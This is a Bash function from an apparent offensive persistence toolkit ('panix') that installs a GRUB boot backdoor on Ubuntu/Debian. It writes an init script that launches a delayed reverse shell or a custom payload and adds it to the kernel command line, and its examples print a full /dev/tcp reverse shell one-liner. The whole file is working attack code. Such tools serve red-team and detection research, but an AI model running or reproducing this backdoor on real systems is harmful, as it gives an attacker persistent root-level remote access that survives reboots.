setup_grub() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local payload=""

	# Check that the user is root.
	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_grub() {
		echo "Usage: ./panix.sh --grub [OPTIONS]"
		echo "--default                          Use default reverse shell payload"
		echo "  --ip <ip>                        Specify IP address for reverse shell"
		echo "  --port <port>                    Specify port for reverse shell"
		echo "--custom                           Use custom payload"
		echo "  --payload <payload>              Specify custom payload command"
		echo ""
	}

	# Detect the distribution.
	local distro_id=""
	if [[ -f /etc/os-release ]]; then
		source /etc/os-release
		distro_id="$ID"
	else
		echo "Error: Unable to detect Linux distribution."
		exit 1
	fi

	# Process options.
	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip="$1"
				;;
			--port )
				shift
				port="$1"
				;;
			--payload )
				shift
				payload="$1"
				;;
			--help|-h )
				usage_grub
				exit 0
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --grub --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --grub --custom --payload \"nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > /dev/null 2>&1 &\""
				echo ""
				exit 0
				;;
			* )
				echo "Invalid option for --grub: $1"
				echo "Try './panix.sh --grub --help' for more information."
				exit 1
				;;
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --grub --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './panix.sh --grub --help' for more information."
		exit 1
	fi

	# Only proceed if distro is Ubuntu/Debian
	if [[ "$distro_id" != "ubuntu" && "$distro_id" != "debian" ]]; then
		echo "This module is not compatible with the current OS: $distro_id"
		echo "This module is only compatible with Ubuntu/Debian, due to network/boot restrictions on other systems."
		echo "Feel free to remove this check and adapt for other operating systems if you wish."
		exit 1
	fi

	# Build the payload
	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be provided when using --default."
			exit 1
		fi
		payload="( sleep 10; nohup setsid bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' & disown ) &"
	fi

	if [[ $custom -eq 1 ]]; then
		if [[ -z $payload ]]; then
			echo "Error: --payload must be specified when using --custom."
			exit 1
		fi
		payload="( sleep 10; ${payload} ) &"
	fi

	# 1) Create /grub-panix.sh as our init script
	local init_script="/grub-panix.sh"
	echo "[*] Creating backdoor init script at: $init_script"
	cat <<EOF > "$init_script"
#!/bin/bash
# Panix GRUB Persistence Backdoor (Ubuntu/Debian)
(
	echo "[*] Panix backdoor payload will execute after 10 seconds delay."
	${payload}
	echo "[+] Panix payload executed."
) &
exec /sbin/init
EOF

	chmod +x "$init_script"
	if [[ $? -ne 0 ]]; then
		echo "Error: Unable to set execute permission on $init_script."
		exit 1
	fi
	echo "[+] Backdoor init script created and made executable."

	# 2) Create a custom file in /etc/default/grub.d/ to append init=/grub-panix.sh
	local grub_custom_dir="/etc/default/grub.d"
	local grub_custom_file="${grub_custom_dir}/99-panix.cfg"

	mkdir -p "$grub_custom_dir"
	echo "[*] Creating custom GRUB configuration file: $grub_custom_file"
	cat <<EOF > "$grub_custom_file"
# Panix GRUB persistence configuration
GRUB_CMDLINE_LINUX_DEFAULT="\$GRUB_CMDLINE_LINUX_DEFAULT init=/grub-panix.sh"
EOF
	if [[ $? -ne 0 ]]; then
		echo "Error: Unable to create $grub_custom_file"
		exit 1
	fi
	echo "[+] Custom GRUB configuration file created."

	# 3) Backup /etc/default/grub (optional, just in case)
	local grub_default="/etc/default/grub"
	if [[ ! -f "$grub_default" ]]; then
		echo "Error: $grub_default not found!"
		exit 1
	fi

	if [[ ! -f "${grub_default}.bak" ]]; then
		echo "[*] Backing up $grub_default to ${grub_default}.bak..."
		cp "$grub_default" "${grub_default}.bak"
		if [[ $? -ne 0 ]]; then
			echo "Error: Unable to back up $grub_default."
			exit 1
		fi
		echo "[+] Backup created at ${grub_default}.bak"
	else
		echo "[!] A backup file ${grub_default}.bak already exists; skipping creation."
	fi

	# 4) Run update-grub to finalize changes
	echo "[*] Running 'update-grub' to apply changes..."
	if ! update-grub; then
		echo "Error: update-grub failed!"
		exit 1
	fi
	echo "[+] GRUB configuration updated. Reboot to activate the payload."
}
